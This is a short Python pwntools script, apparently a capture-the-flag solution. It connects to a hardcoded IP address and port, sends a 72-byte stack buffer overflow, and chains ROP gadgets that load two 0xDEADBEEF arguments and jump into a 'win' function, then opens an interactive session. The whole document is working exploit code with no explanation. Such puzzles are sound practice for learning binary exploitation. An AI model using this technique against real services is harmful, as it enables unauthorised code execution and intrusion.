from pwn import *
c = connect('103.77.175.40', 6011)

a1 = 0xDEADBEEFDEADBEEF
a2 = 0xDEADBEEFDEADBEEF
pop_rdi = 0x00000000004011e5 #0x00000000004011e5 : pop rdi ; ret
pop_rsi = 0x00000000004011ee #0x00000000004011ee : pop rsi ; ret
pop_rax = 0x0000000000401148 #0x0000000000401148 : pop rax ; add dil, dil ; loopne 0x4011b5 ; nop ; ret

# win: 0x4011f3

payload = b'A'*72
payload += p64(pop_rdi) + p64(a1)
payload += p64(pop_rsi) + p64(a2)
payload += p64(0x4011f3+5)

c.sendlineafter(b'number: ' , payload)
c.interactive()

